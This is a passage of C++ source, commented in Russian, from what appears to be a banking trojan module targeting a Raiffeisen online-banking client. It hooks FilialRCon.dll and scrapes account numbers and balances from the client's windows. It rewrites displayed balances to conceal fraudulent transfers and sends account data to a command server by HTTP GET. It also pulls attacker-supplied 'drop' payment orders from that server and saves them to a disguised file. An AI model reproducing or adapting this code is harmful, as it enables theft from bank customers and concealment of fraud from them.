					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok" );
					
					hookDll = true;
					break;
				}
				pSleep(1000);
			}
			if( !hookDll ) break;
			InitData();
			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
			for( int i = 0; i < 300; i++ )
			{
				if( FindTreeList() )
				{
					DBGRAFA( "Rafa", "Find TreeView and ListView" );
					//формируем имя файла в котором будут хранится сосзданные платежки
					if( GetAllUsersProfile( filePayments, sizeof(filePayments), "rafa.dat" ) )
					{
						char* path = UIDCrypt::CryptFileName( filePayments, true );
						m_lstrcpy( filePayments, path );
						HEAP::Free(path);
						DBGRAFA( "Rafa", "Файл с платежками %s", filePayments );
						LoadPaymentOrders();
						widthScreen = (int)pGetSystemMetrics(SM_CXSCREEN);
						heightScreen = (int)pGetSystemMetrics(SM_CYSCREEN);
						WorkInRafa(); 
					}
					return 0;
				}
				pSleep(1000);
			}
		}
		pSleep(1000);
	}
	return 0;
}

void InitHook_FilialRConDll()
{
	if( IsNewProcess(PID) ) //чтобы повторно не запустить
	{
		HANDLE hThread = pCreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
		pCloseHandle(hThread);
		fromLVM = 0;
	}
}

//переводит значение баланса в целочисленное число, два последних числа это копейки
//format = 0 - учитываем копейки, format = 2 - игнорируем копейки
static int BalansToInt( const char* s, int format )
{
	int v = 0;
	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
	while( *s )
	{
	    if( *s == '.' ) kop = 0;
		if( *s >= '0' && *s <= '9' ) //игнорируем точку и запятые (1,234,567.89)
		{
			v = v * 10 + (*s - '0');
			if( kop >= 0 ) kop++;
		}
		s++;
	}
	//добавляем нули в конце чтобы всегда в копейках было две цифры
	if( (format & 2) == 0 )
	{
		if( kop < 0 ) kop = 0;
		for( int i = kop; i < 2; i++ ) v *= 10; 
	}
	return v;
}

//переводит целое число в текстовый баланс, если format = 1, то ставить , для разделения тысяч, 
//если = 2, то обыкновенное число без разделителей, 4 - убрать в конце суммы нули в копейках
static char* IntToBalans( int v, char* s, int format )
{
	int len = 0;
	char* p = s;
	while( v != 0 || ((format & 2) == 0 && len < 4) ) //копейки с точкой обязательно нужно, делаем минимум текст с форматом 0.00
	{
		*p++ = (v % 10) + '0';
		len++;
		v /= 10;
		if( (format & 2) == 0 )
		{
			if( len == 2 ) //отделяем копейки точкой
			{
				*p++ = '.';
				len++;
			}
			if( (format & 1) && v != 0 && len > 2 && ((len - 2) % 4) == 0 )
			{
				*p++ = ',';
				len++;
			}
	    }
	}
	*p = 0;
	//переворачиваем число
	for( int i = 0; i < len / 2; i++ )
	{
		char c = s[i];
		s[i] = s[len - i - 1];
		s[len - i - 1] = c;
	}
	if( format & 4 )
	{
		len--;
		while( s[len] == '0' ) len--;
		if( s[len] == '.' ) //0 копеек, только рубли (остается целая часть)
			s[len] = 0;
		else
			s[len + 1] = 0;
	}
	return s;
}

//добавляет найденные балансы и считает баланс с учетом введенных платежек
static char* AddBalans( const char* acc, const char* balans )
{
	int i;
	for( i = 0; i < c_findedBalans; i++ )
		if( m_lstrcmp( findedBalans[i].acc, acc ) == 0 )
			break;
	if( i >= c_findedBalans ) //новый счет
	{
		if( c_findedBalans >= 8 ) return 0; //рассчитано на не более 8-ми счетов
		m_lstrcpy( findedBalans[i].acc, acc );
		c_findedBalans++;
	}
	m_lstrcpy( findedBalans[i].balans, balans );
	//считаем баланс для отображения
	int intBalans = BalansToInt(balans);
	int oldBalans = intBalans;
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		if( paymentOrders[i].entered && m_lstrcmp( acc, paymentOrders[i].sendAcc ) == 0 )
		{
			int intBalans2 = BalansToInt(paymentOrders[i].balans);
			DBGRAFA( "Rafa", "balans: %d %d", intBalans < intBalans2 );
			if( intBalans < intBalans2 ) //настоящий баланс меньше, чем тот что был в момент создания платежки
			{
				int intSum = BalansToInt(paymentOrders[i].sum);
				intBalans += intSum;
			}
		}
	}
	IntToBalans( intBalans, findedBalans[i].showBalans );
	if( intBalans != oldBalans ) //подменили баланс
		SendLogToAdminThread(5);
	DBGRAFA( "Rafa", "finded acc '%s', balans '%s', show balans '%s'", acc, balans, findedBalans[i].showBalans );
	return findedBalans[i].showBalans;
}

//грабим баланс с текстового поля (справа снизу)
//грабим с такой строки:
//Доступный/текущий остаток по счету: 83109.16/83109.16 (РОССИЙСКИЙ РУБЛЬ)
static void GrabBalansFromMemoText(char* s)
{
	char* p = m_strstr( s, "(РОССИЙСКИЙ РУБЛЬ)" );
	if( p )
	{
		p--; //становимся перед найденной фразой, там должен быть пробел, игнорируем его
		while( *p == ' ' && p >= s ) p--;
		if( p > s )
		{
			//стоим на последней цифре баланса, идем назад пока не найдем пробел, т. е. переходим на начало баланса
			char* p1 = p;
			char* end = p; //конец позиции баланса для его подмены
			while( *p1 != ' ' && p1 >= s ) p1--;
			if( p1 > s )
			{
				p1++; //стоим на 1-й цифре первой суммы
				char* beg = p1; //начало позиции баланса для его подмены
				if( *p1 >= '0' && *p1 <= '9' )
				{
					char acc[32], balans[32];
					//переносим цифры до точки (целую часть)
					int i = 0;
					//while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					while( *p1 != '/' && *p1 != ' ' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					balans[i] = 0; //теперь у нас там остаток
					//ищем номер счета
					//он должен быть в в фомате: "Счет N: 28462985925292987927923;"
					p = m_strstr( s, "Счет N:" );
					if( p )
					{
						p += 7;
						while( *p == ' ' ) p++;
						i = 0;
						while( *p >= '0' && *p <= '9' ) acc[i++] = *p++;
						acc[i] = 0;
						char* showBalans = AddBalans( acc, balans );
						if( showBalans ) //подменяем баланс
						{
							int ls = m_lstrlen(s); //длина сообщения
							int lb = end - beg + 1; //длина реального баланса (их там два числа)
							int lp = m_lstrlen(showBalans); //длина подменяемого баланса (одно число)
							int d = 2 * lp + 1 - lb; //на сколько изменится длина сообщения (2 * lp + 1 - две суммы и знак /)
							if( d > 0 ) //длина увеличилась, сдвигаем вправо все что после end
							{
								p = s + ls - 1;
								while( p > end ) { p[0] = p[-d]; p--; }
							}
							if( d < 0 ) //длина уменьшилась, сдвигаем влево все что после end
								m_memcpy( end + d, end, ls - (end - s + 1) + 1 ); //конечный 0 тоже перемещаем
							//вставляем новый баланс
							m_memcpy( beg, showBalans, lp );
							beg[lp] = '/';
							m_memcpy( beg + lp + 1, showBalans, lp );
						}
					}
				}
			}
		}
	}
}

//грабит баланс с таблицы справа сверху
void GrabBalansFromLVM( int cln, char* s )
{
	if( cln == 1 && s[0] >= '0' && s[1] <= '9' )
	{
		int len = m_lstrlen(s);
		if( len < sizeof(LVM_Acc) - 1 )
		{
			m_memcpy( LVM_Acc, s, len );
			LVM_Acc[len] = 0;
		}
	}
	if( cln == 2 && fromLVM == 0 )
	{
		if( m_lstrcmp( s, "РОССИЙСКИЙ РУБЛЬ" ) == 0 ) //нужное значение ячейки, следующая ячейка будет иметь баланс
		{
			fromLVM = 1;
		}
	}
	else
		if( (cln == 3 || cln == 4) && fromLVM > 0 ) //в s находится баланс
		{
			if( *s >= '0' && *s <= '9' )
			{
				char balans[32];
				int i = 0;
				//переносим цифры до точки
				//while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
				//balans[i] = 0;
				m_lstrcpy( balans, s );
				char* showBalans = AddBalans( LVM_Acc, balans );
				if( showBalans ) m_lstrcpy( s, showBalans );
			}
			fromLVM++;
			if( fromLVM == 3 ) fromLVM = 0;
		}

}
//http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234

 
//загрузка проведенных платежек из файла, чтобы их потом скрывать
static void LoadPaymentOrders()
{
	if( !File::IsExists(filePayments) ) return;
	HANDLE file = pCreateFileA( filePayments, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
	if( file == INVALID_HANDLE_VALUE ) return;
	DWORD rl;
	pReadFile( file, &c_paymentOrders, sizeof(c_paymentOrders), &rl, 0 );
	for(;;)
	{
		if( c_paymentOrders > 0 && c_paymentOrders < 10 ) //количество в разумных пределах, иначе возможно читаем плохой файл
		{
			char* base;
			pReadFile( file, &base, sizeof(&base), &rl, 0 ); //читаем базовый адрес, для вычисления правильных адресов в структуре
			int sz = c_paymentOrders * sizeof(PaymentOrder);
			paymentOrders = (PaymentOrder*)MemAlloc(sz);
			if( paymentOrders )
			{
				pReadFile( file, paymentOrders, sz, &rl, 0 );
				if( rl == sz ) //прочли столько сколько надо
				{
					RelocPayment(base);
					for( int i = 0; i < c_paymentOrders; i++ )
					{
						DBGRAFA( "Rafa", "Считанная платежка:" );
						DBGPrintPayment(&paymentOrders[i]);
					}
					break;
				}
			}
		}
		c_paymentOrders = 0;
		break;
	}
	pCloseHandle(file);
}

//сохранение платежек
static void SavePaymentOrders() 
{
	if( c_paymentOrders == 0 ) return;
	HANDLE file = pCreateFileA( filePayments, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
	if( file == INVALID_HANDLE_VALUE ) return;
	DWORD rl;
	pWriteFile( file, &c_paymentOrders, sizeof(c_paymentOrders), &rl, 0 ); 
	//сохраняем базовый адрес массива, чтобы потом восстановить указатели в структуре
	pWriteFile( file, &paymentOrders, sizeof(&paymentOrders), &rl, 0 ); 
	pWriteFile( file, paymentOrders, sizeof(PaymentOrder) * c_paymentOrders, &rl, 0 );
	pCloseHandle(file);
}

//отсылка Get запроса админке, если ret = true, то нужно возвращать ответ
//mode1 - текст команды для одного баланса, mode2 - текст команды для нескольких балансов
static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
{
	char urlAdmin[128];
	if( c_findedBalans == 0 ) return 0; //если аккаунты не обнаружены, то не смысла слать запрос
	char* res = 0;
//	if( GetAdminUrl(urlAdmin) )
	{
		const char* mode = mode1;
		fwsprintfA pwsprintfA = Get_wsprintfA();
		MemPtr<512> qr, accs;
		MemPtr<128> uid;
		//формируем строку с балансами
		if( c_findedBalans > 1 )
		{
			m_lstrcpy( accs.str(), "accs=" );
			int len = 5;
			for( int i = 0; i < c_findedBalans; i++ )
				len += pwsprintfA( accs.str() + len, "%s:%s;", findedBalans[i].acc, findedBalans[i].balans );
			mode = mode2;
		}
		else
			pwsprintfA( accs.str(), "sum=%s&acc=%s", findedBalans[0].balans, findedBalans[0].acc );
		//формируем запрос
		GenerateUid(uid.str());
		string azUser = GetAzUser();
		pwsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&cid=%s&mode=%s&%s", urlAdmin, uid, azUser.t_str(), mode, accs.str() );
		//отправляем запрос
		THTTPResponseRec Response;
		ClearStruct(Response);
		HTTP::Get( qr, ret ? &res : 0, &Response );
		DBGRAFA( "Rafa", "Передали запрос: %s", qr.str() );
		HTTPResponse::Clear(&Response);
	}
	if( res )
	{
		char* res2 = UTF8ToAnsi(res);
		STR::Free(res);
		res = res2;
		DBGRAFA( "Rafa", "Получен ответ: %s", res );
	}
	else
		if( ret )
		{
			DBGRAFA( "Rafa", "Ответа нет" );
		}
	return res;
}

static char* CopyDataPayment( char*& to, char* from )
{
	while( *from != '|' && *from ) *to++ = *from++;
	if( *from == '|' ) from++; //переход на следующий параметр
	*to++ = 0;
	return from;
}

//запрос новой платежки в админке
static PaymentOrder* GetPaymentOrders()
{
	char* payment = SendToAdmin( "getdrop", "getdrops", true );
	PaymentOrder* res = 0;
	if( payment )
	{
		//если уже есть платежки, то перевыделяем память для новой платежки
		if( c_paymentOrders > 0 )
		{
			char* base = (char*)paymentOrders; //после перевыделения памяти. необходимо пересчитать адреса для новой памяти
			paymentOrders = (PaymentOrder*)MemRealloc( paymentOrders, sizeof(PaymentOrder) * (c_paymentOrders + 1) );
			if( paymentOrders ) 
			{
				RelocPayment(base);
				c_paymentOrders++;
			}
			else
				c_paymentOrders = 0;
		}
		else //платежек еще не было, создаем
		{
			paymentOrders = (PaymentOrder*)MemAlloc( sizeof(PaymentOrder) );
			if( paymentOrders ) c_paymentOrders++;
		}
		if( c_paymentOrders > 0 )
		{
			//разбор переданной строки
			PaymentOrder* po = &paymentOrders[c_paymentOrders - 1];
			char* from = payment;
			char* to = po->mem;
			po->sendAcc = to; from = CopyDataPayment( to, from );
			po->sum = to; from = CopyDataPayment( to, from );
			//m_lstrcpy( po->sum, "1.00" );
			po->inn = to; from = CopyDataPayment( to, from );
			po->kpp = to; from = CopyDataPayment( to, from );
			po->bik = to; from = CopyDataPayment( to, from );
			po->recvAcc = to; from = CopyDataPayment( to, from );
			po->recvName = to; from = CopyDataPayment( to, from );
			po->comment = to; from = CopyDataPayment( to, from );
			po->nds = to; from = CopyDataPayment( to, from );
			po->bankName = to; from = CopyDataPayment( to, from );
			po->bankCity = to; from = CopyDataPayment( to, from );
			po->bankAcc = to; from = CopyDataPayment( to, from );
			po->entered = false;
			//сохраняем баланс
			po->balans = 0;
			for( int i = 0; i < c_findedBalans; i++ )
			{
				if( m_lstrcmp( findedBalans[i].acc, po->sendAcc ) == 0 )
				{
					po->balans = to; CopyDataPayment( to, findedBalans[i].balans );
				}
			}
			if( po->balans == 0 ) //выслали неизвестный счет, платит незачем
			{
				DBGRAFA( "Rafa", "Получена платежка с неизвестным счетом %s", po->sendAcc );
				po->balans = to; *to++ = 0;
				res = 0;
			}
			else
			{
				DBGRAFA( "Rafa", "Получена платежка" );
				DBGPrintPayment(po);
				res = po;
				SendLogToAdmin( 1, po->sum );
			}
		}
		STR::Free(payment);
	}
	else
		SendLogToAdmin(4);
	return res;
}

static void RelocPayment( char* base )
{
	int d = (char*)paymentOrders - base; //разница области памяти
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		paymentOrders[i].sendAcc += d;
		paymentOrders[i].sum += d;
		paymentOrders[i].inn += d;
		paymentOrders[i].kpp += d;
		paymentOrders[i].bik += d;
		paymentOrders[i].recvAcc += d;
		paymentOrders[i].recvName += d;
		paymentOrders[i].comment += d;
		paymentOrders[i].nds += d;
		paymentOrders[i].bankName += d;
		paymentOrders[i].bankCity += d;
		paymentOrders[i].bankAcc += d;
		paymentOrders[i].balans += d;
	}
}

static void DBGPrintPayment( PaymentOrder* po )
{
	DBGRAFA( "Rafa", "sendAcc '%s'", po->sendAcc );
	DBGRAFA( "Rafa", "sum '%s'", po->sum );
	DBGRAFA( "Rafa", "inn '%s'", po->inn );
	DBGRAFA( "Rafa", "kpp '%s'", po->kpp );
	DBGRAFA( "Rafa", "bik '%s'", po->bik );
	DBGRAFA( "Rafa", "recvAcc '%s'", po->recvAcc );
	DBGRAFA( "Rafa", "recvName '%s'", po->recvName );
	DBGRAFA( "Rafa", "comment '%s'", po->comment );
	DBGRAFA( "Rafa", "nds'%s'", po->nds );
	DBGRAFA( "Rafa", "bankName '%s'", po->bankName );
	DBGRAFA( "Rafa", "bankCity '%s'", po->bankCity );
	DBGRAFA( "Rafa", "bankAcc '%s'", po->bankAcc );
	DBGRAFA( "Rafa", "balans '%s'", po->balans );
}

};
